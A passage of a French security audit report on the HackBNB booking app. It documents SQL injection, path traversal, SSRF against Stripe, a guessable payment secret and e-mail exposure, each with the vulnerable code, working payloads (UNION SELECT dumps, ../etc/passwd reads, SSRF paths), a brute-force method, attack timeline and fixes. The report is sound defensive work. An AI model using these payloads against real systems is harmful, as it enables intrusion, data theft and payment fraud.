+<td>Secret de confirmation et session Stripe de la réservation <code>85A1NBEJ</code></td>
+<td><strong>Certain</strong></td>
+<td><code>UNION SELECT … WHERE bookings.reference = '85A1NBEJ'</code> → <code>200</code> (11:16:44)</td>
+</tr>
+<tr>
+<td>Code source : <code>app.py</code>, <code>api/bookings/bookings_api.py</code>, <code>services/stripe.py</code></td>
+<td><strong>Certain</strong></td>
+<td>Path traversal → <code>200</code> (11:18:56–11:19:07)</td>
+</tr>
+<tr>
+<td><code>/etc/passwd</code> du serveur</td>
+<td><strong>Certain</strong></td>
+<td><code>?name=../../etc/passwd</code> → <code>200</code> (11:19:10)</td>
+</tr>
+<tr>
+<td>Arborescence et extraits du code back (tracebacks)</td>
+<td><strong>Certain</strong></td>
+<td>3 réponses <code>500</code> de 23 Ko en mode debug (11:18:49–11:18:54)</td>
+</tr>
+<tr>
+<td>E-mail de l'hôte des annonces consultées</td>
+<td><strong>Quasi certain</strong></td>
+<td>Chaque réponse <code>GET /api/rooms/&lt;id&gt;</code> servie à l'IP contient <code>host.email</code> par construction du code (D5)</td>
+</tr>
+<tr>
+<td>Table <code>users</code> (e-mails, hash MD5 des mots de passe)</td>
+<td><strong>Supposition</strong></td>
+<td>La SQLi le permettait (cf. D1), mais aucune requête <code>UNION … FROM users</code> n'apparaît dans le journal</td>
+</tr>
+<tr>
+<td>Clé API Stripe</td>
+<td><strong>Non exfiltrée</strong> d'après le journal</td>
+<td><code>stripe.py</code> lu par D2 ne contient plus la clé (<code>os.getenv</code>), et <code>?name=.env</code> a échoué (<code>500</code>). La clé reste compromise par ailleurs via le dépôt Git (D6).</td>
+</tr>
+</tbody></table></div>
+
+<hr />
+
+<h2 id="6-détail-des-vulnérabilités">6. Détail des vulnérabilités</h2>
+<p>
+
+Chaque fiche suit la même structure : référentiels (CWE, OWASP), localisation et code vulnérable, mécanisme (cause racine), preuves sur la pré-production, impact, risque ANSSI, exploitation lors de l'attaque du 7 novembre, recommandation, puis correctif et re-test.
+</p>
+
+<hr />
+
+<h3 id="d1-injection-sql-sur-apirooms">D1 : Injection SQL sur <code>/api/rooms/</code></h3>
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Champ</th>
+<th>Valeur</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>CWE</strong></td>
+<td>CWE-89 (SQL Injection)</td>
+</tr>
+<tr>
+<td><strong>OWASP Top 10</strong></td>
+<td>A03:2021 – Injection</td>
+</tr>
+<tr>
+<td><strong>Référence test</strong></td>
+<td>OWASP WSTG-INPV-05</td>
+</tr>
+<tr>
+<td><strong>Localisation</strong></td>
+<td><code>back/api/rooms/rooms_api.py</code>, ligne 18</td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+<strong>Code vulnérable</strong>
+</p>
+
+<div class="codeblock"><div class="code-lang">python</div><div class="hl"><pre><span></span><span class="k">if</span> <span class="s2">&quot;category&quot;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="p">:</span>
+    <span class="n">category</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="s2">&quot;category&quot;</span><span class="p">]</span>
+    <span class="n">rooms</span> <span class="o">=</span> <span class="n">Room</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter</span><span class="p">(</span><span class="n">text</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;category = &#39;</span><span class="si">{</span><span class="n">category</span><span class="si">}</span><span class="s2">&#39;&quot;</span><span class="p">))</span><span class="o">.</span><span class="n">all</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>
+
+<strong>Mécanisme</strong> : le paramètre <code>category</code> est concaténé directement dans une requête SQL brute (<code>sqlalchemy.text</code>) sans requête préparée ni paramètre bindé, permettant l'injection de clauses SQL arbitraires dans la condition <code>WHERE</code>.
+</p>
+
+<h4 id="preuve-1-bypass-logique-de-la-clause-where">Preuve 1 : Bypass logique de la clause WHERE</h4>
+<p>
+
+Payload : <code>x' OR '1'='1'-- -</code>
+</p>
+
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Requête</th>
+<th>Réponse</th>
+</tr></thead><tbody>
+<tr>
+<td><img src="img/D1_SQLi_1-bypass_req.png" alt="requête bypass" /></td>
+<td><img src="img/D1_SQLi_1-bypass_res.png" alt="réponse bypass" /></td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+<code>HTTP/2 200 OK</code>, <code>Content-Length: 3691</code> : 10 rooms renvoyées, alors qu'une catégorie inexistante (<code>x</code>) devrait renvoyer <code>[]</code> (liste vide). Preuve du contrôle de la logique SQL.
+</p>
+
+<h4 id="preuve-2-exfiltration-de-données-hors-périmètre-table-users">Preuve 2 : Exfiltration de données hors périmètre (table <code>users</code>)</h4>
+<p>
+
+Payload : <code>x' UNION SELECT id, name, email, password_hash, 0, 0, 0, 0 FROM users-- -</code>
+</p>
+
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Requête</th>
+<th>Réponse</th>
+</tr></thead><tbody>
+<tr>
+<td><img src="img/D1_SQLi_2-dump-users_req.png" alt="requête dump users" /></td>
+<td><img src="img/D1_SQLi_2-dump-users_res.png" alt="réponse dump users" /></td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+Les colonnes sélectionnées sont mappées positionnellement sur le modèle <code>Room</code> par l'ORM SQLAlchemy (<code>id→id</code>, <code>name→title</code>, <code>email→city</code>, <code>password_hash→price</code>). 3 comptes extraits :
+</p>
+
+<div class="table-wrap"><table>
+<thead><tr>
+<th>id</th>
+<th>name</th>
+<th>email</th>
+<th>password_hash</th>
+</tr></thead><tbody>
+<tr>
+<td>1</td>
+<td>John Doe</td>
+<td>john@doe.com</td>
+<td>XX <em>(valeur de seed, pas un hash réel : cf. note ci-dessous)</em></td>
+</tr>
+<tr>
+<td>2</td>
+<td>test</td>
+<td>test@test.com</td>
+<td>5f4dcc3b5aa765d61d8327deb882cf99</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Pain perdu vendredi !</td>
+<td>clubquisine@guardiaschool.fr</td>
+<td>86afb02a7da647a644c07deaccd233e6</td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+<em>Note : le compte <code>John Doe</code> est initialisé dans <code>database/seed.py</code> avec <code>password_hash=&quot;XX&quot;</code> en dur (donnée de démo, pas un hash MD5 valide) : seuls les comptes 2 et 3 illustrent le problème réel de hachage MD5 non salé.</em>
+</p>
+
+<p>
+
+<strong>Impact</strong> : compromission totale de la base de données (lecture arbitraire de toute table via UNION SELECT), incluant les comptes utilisateurs et leurs hash de mot de passe.
+</p>
+
+<p>
+
+<strong>Niveau de risque (échelle ANSSI)</strong> : Exploitation <strong>Facile</strong> × Impact <strong>Critique</strong> = <strong>Critique</strong>.
+</p>
+
+<p>
+
+<strong>Exploitée lors de l'attaque du 7 novembre</strong> : <strong>Oui.</strong> 11:11:37 : <code>category=hut' OR 1=1 --</code> → <code>200</code>. Puis 11:16:44 : <code>UNION SELECT … FROM bookings WHERE bookings.reference = '85A1NBEJ'</code> → <code>200</code>, pour lire le secret de confirmation de sa réservation (cf. D4).
+</p>
+
+<p>
+
+<strong>Recommandation</strong> : remplacer la requête SQL brute par l'ORM standard (<code>Room.query.filter_by(category=category)</code>) ou par une requête paramétrée bindée (<code>text(&quot;category = :cat&quot;).bindparams(cat=category)</code>). Cf. OWASP SQL Injection Prevention Cheat Sheet.
+</p>
+
+<p>
+
+<strong>Observation complémentaire (hors périmètre D1-D8, à ajouter aux recommandations finales)</strong> : les hash extraits font 32 caractères hexadécimaux → format <strong>MD5</strong>, algorithme de hachage obsolète et non salé (<code>5f4dcc3b5aa765d61d8327deb882cf99</code> = MD5 connu de <code>&quot;password&quot;</code>). Recommandation : migrer vers bcrypt/argon2 avec sel.
+</p>
+
+<p>
+
+<strong>Correctif et re-test</strong> : <em>statut : à appliquer (code non corrigé au 13/11/2026).</em> Après correction, rejouer la requête de l'attaque : <code>GET /api/rooms/?category=x'%20OR%20'1'='1'--%20-</code> doit renvoyer <code>200 []</code>. La requête <code>UNION SELECT</code> de l'attaquant ne doit plus renvoyer de données de <code>bookings</code>.
+</p>
+
+<hr />
+
+<h3 id="d2-path-traversal-sur-apiuploads">D2 : Path Traversal sur <code>/api/uploads/</code></h3>
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Champ</th>
+<th>Valeur</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>CWE</strong></td>
+<td>CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)</td>
+</tr>
+<tr>
+<td><strong>OWASP Top 10</strong></td>
+<td>A01:2021 – Broken Access Control</td>
+</tr>
+<tr>
+<td><strong>Référence test</strong></td>
+<td>OWASP WSTG-ATHZ-01 (Testing Directory Traversal File Include)</td>
+</tr>
+<tr>
+<td><strong>Localisation</strong></td>
+<td><code>back/api/uploads/uploads_api.py</code>, ligne 7</td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+<strong>Code vulnérable</strong>
+</p>
+
+<div class="codeblock"><div class="code-lang">python</div><div class="hl"><pre><span></span><span class="nd">@uploads_api</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">get_upload</span><span class="p">():</span>
+   <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="s1">&#39;uploads/&#39;</span> <span class="o">+</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;name&quot;</span><span class="p">))</span>
+</pre></div>
+</div>
+<p>
+
+<strong>Mécanisme</strong> : le paramètre <code>name</code> est concaténé directement à un chemin de base (<code>uploads/</code>) sans filtrage des séquences <code>../</code>, permettant de sortir du répertoire prévu.
+</p>
+
+<h4 id="preuve-1-lecture-du-code-source-applicatif">Preuve 1 : Lecture du code source applicatif</h4>
+<p>
+
+Payload : <code>../app.py</code>
+</p>
+
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Requête</th>
+<th>Réponse</th>
+</tr></thead><tbody>
+<tr>
+<td><img src="img/D2_PathTraversal_1-read-source_req.png" alt="requête lecture source" /></td>
+<td><img src="img/D2_PathTraversal_1-read-source_res.png" alt="réponse lecture source" /></td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+<code>HTTP/2 200 OK</code>, <code>Content-Type: text/x-python</code>, <code>Content-Disposition: inline; filename=app.py</code> : code source complet de <code>back/app.py</code> renvoyé en clair.
+</p>
+
+<h4 id="preuve-2-lecture-fichier-système-hors-périmètre-applicatif">Preuve 2 : Lecture fichier système (hors périmètre applicatif)</h4>
+<p>
+
+Payload : <code>../../../../../etc/passwd</code>
+</p>
+
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Requête</th>
+<th>Réponse</th>
+</tr></thead><tbody>
+<tr>
+<td><img src="img/D2_PathTraversal_2-read-etc-passwd_req.png" alt="requête lecture /etc/passwd" /></td>
+<td><img src="img/D2_PathTraversal_2-read-etc-passwd_res.png" alt="réponse lecture /etc/passwd" /></td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+<code>HTTP/2 200 OK</code>, <code>Content-Type: application/octet-stream</code>, <code>Content-Disposition: inline; filename=passwd</code> : fichier système <code>/etc/passwd</code> renvoyé en clair. Preuve que la faille dépasse largement le périmètre applicatif (accès au système de fichiers du serveur/conteneur).
+</p>
+
+<p>
+
+<strong>Impact</strong> : lecture arbitraire de tout fichier accessible par le process Flask (code source, configuration, fichiers système), bien au-delà du répertoire <code>uploads/</code> prévu.
+</p>
+
+<p>
+
+<strong>Niveau de risque (échelle ANSSI)</strong> : Exploitation <strong>Facile</strong> × Impact <strong>Critique</strong> = <strong>Critique</strong>.
+</p>
+
+<p>
+
+<strong>Exploitée lors de l'attaque du 7 novembre</strong> : <strong>Oui.</strong> 11:18:56 – 11:19:10 : lecture de <code>../app.py</code>, <code>../api/bookings/bookings_api.py</code>, <code>../services/stripe.py</code> et <code>../../etc/passwd</code> → <code>200</code>.
+</p>
+
+<p>
+
+<strong>Recommandation</strong> : valider/assainir le paramètre <code>name</code> (whitelist de caractères, <code>os.path.basename()</code>), et vérifier via <code>os.path.realpath()</code> que le chemin résolu reste bien dans le répertoire <code>uploads/</code>.
+</p>
+
+<p>
+
+<strong>Correctif et re-test</strong> : <em>statut : à appliquer (code non corrigé au 13/11/2026).</em> Après correction, rejouer la requête de l'attaque : <code>GET /api/uploads/?name=../app.py</code> et <code>?name=../../etc/passwd</code> doivent renvoyer <code>404</code> (ou <code>400</code>), sans contenu.
+</p>
+
+<hr />
+
+<h3 id="d3-ssrf-sur-apibookingscheckout-lines">D3 : SSRF sur <code>/api/bookings/&lt;reference&gt;/checkout-lines</code></h3>
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Champ</th>
+<th>Valeur</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>CWE</strong></td>
+<td>CWE-918 (Server-Side Request Forgery)</td>
+</tr>
+<tr>
+<td><strong>OWASP Top 10</strong></td>
+<td>A10:2021 – Server-Side Request Forgery</td>
+</tr>
+<tr>
+<td><strong>Localisation</strong></td>
+<td><code>back/services/stripe.py</code>, lignes 31-36 + <code>back/api/bookings/bookings_api.py</code>, ligne 44</td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+<strong>Code vulnérable</strong>
+</p>
+
+<div class="codeblock"><div class="code-lang">python</div><div class="hl"><pre><span></span><span class="c1"># bookings_api.py</span>
+<span class="n">checkout_session_id</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;checkout_session_id&quot;</span><span class="p">)</span>  <span class="c1"># non contrôlé</span>
+<span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">get_checkout_lines</span><span class="p">(</span><span class="n">checkout_session_id</span><span class="p">))</span>
+
+<span class="c1"># stripe.py</span>
+<span class="k">def</span> <span class="nf">get_checkout_lines</span><span class="p">(</span><span class="n">checkout_session_id</span><span class="p">):</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;https://api.stripe.com/v1/checkout/sessions/</span><span class="si">{</span><span class="n">checkout_session_id</span><span class="si">}</span><span class="s2">/line_items&quot;</span>
+    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;STRIPE_API_KEY&#39;</span><span class="p">),</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>  <span class="c1"># clé secrète du serveur</span>
+    <span class="k">return</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">&quot;data&quot;</span><span class="p">]</span>
+</pre></div>
+</div>
+<p>
+
+<strong>Mécanisme</strong> : le paramètre <code>checkout_session_id</code> est injecté tel quel dans l'URL interrogée auprès de l'API Stripe, authentifiée avec la clé secrète du marchand. En injectant une séquence <code>../../</code> suivie d'un <code>#</code> (pour tronquer le <code>/line_items</code> final), on détourne la requête vers n'importe quel endpoint Stripe (condition : la réservation utilisée doit être payée, sinon <code>422</code>).
+</p>
+
+<h4 id="preuve-détournement-vers-un-endpoint-liste-fuite-cross-clients">Preuve : Détournement vers un endpoint liste (fuite cross-clients)</h4>
+<p>
+
+Réservation utilisée : <code>57TDGUK1</code> (<code>is_paid: true</code>)
+Payload : <code>checkout_session_id=../../checkout/sessions%23</code>
+</p>
+
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Requête</th>
+<th>Réponse</th>
+</tr></thead><tbody>
+<tr>
+<td><img src="img/D3_SSRF_1-list-all-sessions_req.png" alt="requête SSRF" /></td>
+<td><img src="img/D3_SSRF_1-list-all-sessions_res.png" alt="réponse SSRF" /></td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+<code>HTTP/2 200 OK</code> : la réponse contient les sessions de paiement Stripe de <strong>tous les clients</strong>, pas seulement celles liées à la réservation <code>57TDGUK1</code>.
+</p>
+
+<p>
+
+<strong>Observation complémentaire (chaînage D3 → D4)</strong> : une des sessions retournées expose, dans son champ <code>success_url</code>, le <code>checkout_confirmation_secret</code> <strong>en clair</strong> d'une autre réservation (<code>VM4UXB28</code>, <code>payment_status: &quot;unpaid&quot;</code>) :
+</p>
+
+<div class="codeblock"><div class="hl"><pre><span></span>https://hackbnb.dashbox.cloud/booking/VM4UXB28?checkout_confirmation_secret=2cac7e5ac3…[tronqué]
+</pre></div>
+</div>
+<p>
+
+→ <strong>chaînage direct D3 → D4</strong> : cette SSRF permet de récupérer le secret de confirmation de <em>n'importe quelle</em> réservation d'<em>un autre client</em>, sans avoir besoin de le bruteforcer (cf. D4). C'est un vecteur d'exploitation encore plus efficace que le bruteforce décrit dans le rapport de pentest pour D4.
+</p>
+
+<p>
+
+<strong>Impact</strong> : exposition de données de paiement et de secrets de confirmation appartenant à d'autres clients, via une requête authentifiée avec la clé API du marchand détournée vers un périmètre non prévu par l'application.
+</p>
+
+<p>
+
+<strong>Niveau de risque (échelle ANSSI)</strong> : Exploitation <strong>Modérée</strong> × Impact <strong>Critique</strong> = <strong>Critique</strong>.
+</p>
+
+<p>
+
+<strong>Exploitée lors de l'attaque du 7 novembre</strong> : <strong>Oui.</strong> 11:19:43 : <code>checkout_session_id=../../customers%23</code> → <code>200</code>, 19 128 640 octets (liste des clients Stripe). Puis 11:20:03 – 11:23:54 : <code>../../customers/cus_…/payment_methods%23</code> pour 624 clients, dont 623 par script <code>python-requests</code>.
+</p>
+
+<p>
+
+<strong>Recommandation</strong> : valider <code>checkout_session_id</code> contre un format strict (regex <code>^cs_[a-zA-Z0-9_]+$</code>), et/ou vérifier que la session Stripe récupérée correspond bien au <code>stripe_checkout_session_id</code> déjà enregistré pour la réservation concernée.
+</p>
+
+<p>
+
+<strong>Correctif et re-test</strong> : <em>statut : à appliquer (code non corrigé au 13/11/2026).</em> Après correction, rejouer la requête de l'attaque : <code>GET /api/bookings/&lt;réf. payée&gt;/checkout-lines?checkout_session_id=../../customers%23</code> doit renvoyer <code>400</code>, et un <code>checkout_session_id</code> différent de celui enregistré pour la réservation doit être refusé.
+</p>
+
+<hr />
+
+<h3 id="d4-génération-vulnérable-du-secret-de-confirmation-de-paiement">D4 : Génération vulnérable du secret de confirmation de paiement</h3>
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Champ</th>
+<th>Valeur</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>CWE</strong></td>
+<td>CWE-330 (Use of Insufficiently Random Values)</td>
+</tr>
+<tr>
+<td><strong>OWASP Top 10</strong></td>
+<td>A02:2021 – Cryptographic Failures</td>
+</tr>
+<tr>
+<td><strong>Localisation</strong></td>
+<td><code>back/api/bookings/bookings_api.py</code>, lignes 93-95</td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+<strong>Code vulnérable</strong>
+</p>
+
+<div class="codeblock"><div class="code-lang">python</div><div class="hl"><pre><span></span><span class="n">random_string</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()))</span>  <span class="c1"># timestamp UNIX à la seconde près</span>
+<span class="n">checkout_confirmation_secret</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha512</span><span class="p">(</span><span class="n">random_string</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>
+
+<strong>Mécanisme</strong> : le secret de confirmation de paiement n'est qu'un hash SHA-512 du timestamp serveur (en secondes). Un attaquant connaissant l'heure approximative de création d'une réservation (via le header <code>Date</code> de la réponse HTTP, par exemple) peut bruteforcer ce secret en quelques dizaines/centaines de tentatives, et confirmer le paiement d'une réservation <strong>sans jamais payer</strong>.
+</p>
+
+<p>
+
+<strong>Méthodologie</strong> : Burp Intruder, payload type <code>Numbers</code> (plage ciblée autour du timestamp de création, pas de l'heure courante : le secret est fixé au moment de la création et ne change pas), règle de traitement <code>Hash → SHA-512</code> appliquée au payload, position marquée sur la valeur de <code>confirmationSecret</code> dans le corps JSON de <code>POST /bookings/&lt;reference&gt;/confirm-checkout</code>.
+</p>
+
+<h4 id="preuve-bruteforce-réussi">Preuve : Bruteforce réussi</h4>
+<p>
+
+Réservation créée : <code>XFX6Q5I2</code> (sans jamais ouvrir le <code>checkout_url</code> ni effectuer de paiement réel)
+Fenêtre testée : timestamp centre (± marge) autour de l'heure de création : secret retrouvé exactement au timestamp <code>1794408723</code> (= heure de création exacte, aucun décalage)
+</p>
+
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Requête</th>
+<th>Réponse</th>
+</tr></thead><tbody>
+<tr>
+<td><img src="img/D4_WeakSecret_1-bruteforce-success_req.png" alt="requête bruteforce réussi" /></td>
+<td><img src="img/D4_WeakSecret_1-bruteforce-success_res.png" alt="réponse bruteforce réussi" /></td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+Le tableau de résultats Intruder montre la requête #91 en <code>200 OK</code> (longueur de réponse 166, <code>{&quot;success&quot;: true}</code>), distincte des dizaines de tentatives en <code>422</code> (longueur 207) juste au-dessus.
+</p>
+
+<h4 id="preuve-confirmation-sans-paiement-réel">Preuve : Confirmation sans paiement réel</h4>
+<div class="codeblock"><div class="hl"><pre><span></span>GET /api/bookings/XFX6Q5I2 HTTP/2
+</pre></div>
+</div>
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Requête</th>
+<th>Réponse</th>
+</tr></thead><tbody>
+<tr>
+<td><img src="img/D4_WeakSecret_2-booking-confirmed-unpaid_req.png" alt="requête vérification paiement" /></td>
+<td><img src="img/D4_WeakSecret_2-booking-confirmed-unpaid_res.png" alt="réponse vérification paiement" /></td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+<code>&quot;is_paid&quot;: true</code> : la réservation de 340€ (<code>room-1</code>, 2 nuits) est confirmée comme payée, sans qu'aucun paiement Stripe réel n'ait été effectué (le <code>checkout_url</code> n'a jamais été ouvert).
+</p>
+
+<p>
+
+<strong>Impact</strong> : contournement complet du paiement : confirmation arbitraire de n'importe quelle réservation sans transaction financière réelle.
+</p>
+
+<p>
+
+<strong>Niveau de risque (échelle ANSSI)</strong> : Exploitation <strong>Modérée</strong> × Impact <strong>Critique</strong> = <strong>Critique</strong>.
+</p>
+
+<p>
+
+<strong>Exploitée lors de l'attaque du 7 novembre</strong> : <strong>Oui, sans bruteforce.</strong> Deux essais refusés (11:13:52 et 11:13:57, <code>422</code>), puis le secret est lu via D1 et la réservation <code>85A1NBEJ</code> est confirmée sans paiement à 11:16:54 (<code>200</code>).
+</p>
+
+<p>
+
+<strong>Recommandation</strong> : générer le secret avec une source d'aléa cryptographiquement sûre (<code>secrets.token_hex(32)</code> en Python), indépendante de toute information prévisible comme un timestamp.
+</p>
+
+<p>
+
+<strong>Observations complémentaires</strong> :
+</p>
+
+<ul>
+
+<li>
+
+
+combiné à D3 (SSRF), ce secret peut aussi être lu directement dans le <code>success_url</code> d'une session Stripe d'un autre client (cf. l'observation sur le chaînage D3 → D4), rendant le bruteforce ci-dessus même superflu pour un attaquant qui aurait déjà exploité D3.
+
+</li>
+
+<li>
+
+
+le secret est transmis <strong>dans l'URL</strong> de redirection (<code>success_url=...&amp;checkout_confirmation_secret=...</code>, <code>back/services/stripe.py</code>), donc par construction journalisé par tout reverse-proxy/serveur web en amont (le format de log <code>combined</code> d'Apache inclut la ligne de requête complète), ce qui correspond à CWE-598 (Use of GET Request Method With Sensitive Query Strings). Quiconque a accès aux journaux d'accès peut rejouer ce secret sans même avoir à le bruteforcer.
+
+</li>
+
+</ul>
+
+<p>
+
+<strong>Correctif et re-test</strong> : <em>statut : à appliquer (code non corrigé au 13/11/2026).</em> Après correction, rejouer la requête de l'attaque : Le bruteforce Intruder (SHA-512 des timestamps autour de la création) doit renvoyer uniquement des <code>422</code>. Le secret généré doit faire 64 caractères hexadécimaux aléatoires, sans lien avec l'heure.
+</p>
+
+<hr />
+
+<h3 id="d5-exposition-de-ladresse-e-mail-des-hôtes-dans-les-réponses-api">D5 : Exposition de l'adresse e-mail des hôtes dans les réponses API</h3>
+<div class="table-wrap"><table>
+<thead><tr>
+<th>Champ</th>
+<th>Valeur</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>CWE</strong></td>
+<td>CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor)</td>
+</tr>
+<tr>
+<td><strong>OWASP Top 10</strong></td>
+<td>A01:2021 – Broken Access Control (<em>Excessive Data Exposure</em>, OWASP API3:2023)</td>
+</tr>
+<tr>
+<td><strong>Référence test</strong></td>
+<td>OWASP WSTG-INFO-05 (Review Webpage Content for Information Leakage)</td>
+</tr>
+<tr>
+<td><strong>Localisation</strong></td>
+<td><code>back/api/users/users_models.py</code>, lignes 18-23 + <code>back/api/rooms/rooms_models.py</code>, ligne 35</td>
+</tr>
+</tbody></table></div>
+
+<p>
+
+<strong>Code vulnérable</strong>
+</p>
+
+<div class="codeblock"><div class="code-lang">python</div><div class="hl"><pre><span></span><span class="c1"># back/api/users/users_models.py:18</span>
+<span class="k">def</span> <span class="nf">to_dict</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+    <span class="k">return</span> <span class="p">{</span>
+        <span class="s2">&quot;id&quot;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">id</span><span class="p">,</span>
+        <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">name</span><span class="p">,</span>
+        <span class="s2">&quot;email&quot;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">email</span><span class="p">,</span>   <span class="c1"># e-mail renvoyé sans restriction</span>
+    <span class="p">}</span>
+
+<span class="c1"># back/api/rooms/rooms_models.py:34</span>
+<span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">host_user</span><span class="p">:</span>
+    <span class="n">output</span><span class="p">[</span><span class="s2">&quot;host&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">host_user</span><span class="o">.</span><span class="n">to_dict</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>
+
+<strong>Mécanisme</strong> : la sérialisation publique d'une chambre (<code>Room.to_dict()</code>) embarque l'objet hôte complet, dont le <code>to_dict()</code> inclut l'adresse e-mail. Ce <code>to_dict()</code> est appelé par les routes publiques <code>GET /rooms/</code> et <code>GET /rooms/&lt;room_id&gt;</code> (<code>back/api/rooms/rooms_api.py</code>, lignes 22 et 35), ainsi que par <code>GET /bookings/&lt;reference&gt;</code> via <code>Booking.to_dict()</code> → <code>room.to_dict()</code> (<code>back/api/bookings/bookings_models.py</code>, ligne 36). Aucune authentification n'est requise.
+</p>
+
+<h4 id="preuve-lecture-de-le-mail-de-lhôte-sans-authentification">Preuve : Lecture de l'e-mail de l'hôte sans authentification</h4>
+<div class="codeblock"><div class="code-lang">bash</div><div class="hl"><pre><span></span>curl<span class="w"> </span>-s<span class="w"> </span>https://hackbnb.dashbox.cloud/api/rooms/1<span class="w"> </span><span class="p">|</span><span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>json.tool
+</pre></div>
+</div>
+<div class="codeblock"><div class="code-lang">json</div><div class="hl"><pre><span></span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;title&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Nature, Spa &amp; bien-être au Châtaignier&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;host&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">&quot;email&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;john@doe.com&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;John Doe&quot;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>
+
+<img src="img/D5_EmailExposure_1-room-host-email.png" alt="D5 : e-mail de l'hôte exposé dans la réponse API" />
+</p>
+
+<p>
+
+<code>HTTP/2 200 OK</code>, aucun cookie ni jeton envoyé : le champ <code>host.email</code> est renvoyé en clair. <code>GET /api/rooms/</code> renvoie le même objet pour les <strong>10</strong> chambres de la pré-production (toutes rattachées à l'hôte <code>john@doe.com</code>).
+</p>
+
+<p>
+
+<strong>Impact</strong> : l'adresse e-mail est une donnée personnelle au sens du RGPD. HackBNB décrit elle-même ses utilisateurs comme ayant « des profils sensibles du monde cyber » (annexe 1, e-mail initial d'Élodie Marchand), un constat corroboré par l'entretien avec le responsable technique (annexe 3). La fuite permet de collecter les e-mails de tous les hôtes en une requête, puis de les cibler (phishing, corrélation d'identités). Les conséquences restent isolées à cette donnée.
+</p>
+
+<p>
+
+<strong>Niveau de risque (échelle ANSSI)</strong> : Exploitation <strong>Facile</strong> × Impact <strong>Important</strong> = <strong>Majeur</strong>.
+</p>
+
+<p>
+
